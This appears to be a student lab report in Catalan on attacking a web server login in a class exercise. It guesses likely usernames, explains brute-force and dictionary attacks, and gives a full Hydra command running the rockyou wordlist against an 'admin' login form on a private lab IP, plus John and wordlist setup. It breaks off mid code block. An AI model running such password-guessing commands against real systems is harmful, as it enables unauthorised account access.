## 1 Investigació  prèvia:
**Quins usuaris hi hauria de have?***Per el que jo entenc en el anunciat et demana que expliquis quins usuaris hi hauria d'haver en la carpeta d'usuaris del servidor i el nom d'usuari que fan serivir.*
*Normalement en un servidor web , hi ha usuaris com admin,root,guest, i usuaris personalizats que poden haver creat els administradors del sistema.*
**Quin nom d'usuari fan servir?** *Els noms d'usuari poden variar, però sovint es fan servir noms senzills i fàcils de recordar, com admin,user o noms basats en els noms dels mebmres del personal*

--------
## 2. Atac:

1. **Expliqueu quins sòn els mètodes d'atac que heu intentat (encara que hagin tingut extit).**

**Metode 1 Força bruta "No hauria de tenir exit.**
**Explicació:** *La força bruta consiteix en provar totes les combinacions possibles de les contrasñyes fins a trobar la correcta.*

- **Peque no hauria de tenirt exit***La força bruta pot ser molt lenta i ineficaç si la contrasenya és forta i la llista de contrasenyes no inclou la contrasenya real.*
- **Com fer-ho:**
1. *Instal·la hydra a Klai Linux:*

```bash
sudo apt-get install hydra
```
2. *Executa l'atac de força bruta:*

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.3 http-post-form "/vaca:username=^USER^&password=^PASS^:F=incorrect"
```
- **-l admin***:Especifica l'usuari*.
- **-P /usr/share/wordlist/rockyou.txt***:Usa una llista de contrasenyes communa.*
- **192.168.100.3***:IP del servidor.*
- **http-post-form***:Indica que és una pàgina web amb formulari HTTP.*
- **/vaca:username=^USER^&password=^PASS^:F=incorrect***:Pàrametres del formulari.*

**Mètode 2: Atac de Diccionari:**
**Explicació:** *L'atac de diccionari prova paraules communes i variants per adivinar la contrasenya.*
**Perque no te exit:** *Si la contrasenya no està inclosa en el diccionari o és una variant complexa,l'atac fallara.*

- **Com fer-ho:**
1. *Instala "Jhon" a Kali Linux.*

```bash
sudo apt-get install john
```

2. *Obtenir un fitxer de paraules comunes (diccionari). pots obtenir un diccionari de contrasenyes exposades, com el diccionari de DragonJar, que inclou contrasenyes de filtracions de llocs com Facebock i altres.*
*Jo fare servir el dichionari de rockyou.*

```bash
mkdir ~/rockyou
cd ~/rockyou
git clone https://github.com/IrishMaestro/rockyou
gzip -d rockyou.txt.gz
